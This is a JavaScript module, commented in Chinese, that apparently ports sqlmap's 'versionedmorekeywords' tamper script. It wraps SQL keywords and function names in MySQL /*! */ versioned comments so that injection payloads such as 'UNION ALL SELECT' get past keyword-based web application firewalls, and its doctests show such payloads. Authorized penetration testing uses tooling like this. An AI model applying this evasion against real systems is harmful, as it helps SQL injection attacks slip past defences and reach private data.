// 版本化注释包裹每个关键字（比 versionedkeywords 更激进，覆盖全部常见关键字 + 函数名）
// MySQL 解析 /*! KEYWORD */ 为执行，WAF 可能按普通注释忽略其中的关键字 → 绕过
// [T-6 2026-10-14] 关键字表收敛到 versionedKeywords.js 单一真源，并补齐上游同族覆盖的
// 函数名（CONCAT/CHAR/IFNULL/CAST/CURRENT_USER…）；漏包函数名属同族内不自洽。
import { versionedWordsRe } from '../versionedKeywords.js';

const RE = versionedWordsRe();

export const versionedmorekeywords = {
  name: 'versionedmorekeywords',
  description: '用 /*! KEYWORD */ 包裹每个关键字与函数名，绕过基于关键字的 WAF（MySQL 执行注释内语法）',
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  doctests: [
    { input: 'UNION ALL SELECT', output: '/*! UNION */ /*! ALL */ /*! SELECT */' },
    // [T-6] 函数名同样被包裹（上游同族行为，漏包会让 CONCAT/CHAR 签名暴露）
    { input: "CONCAT(CHAR(58))", output: '/*! CONCAT */(/*! CHAR */(58))' },
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    return payload.replace(RE, '/*! $1 */');
  },
};

export default versionedmorekeywords;
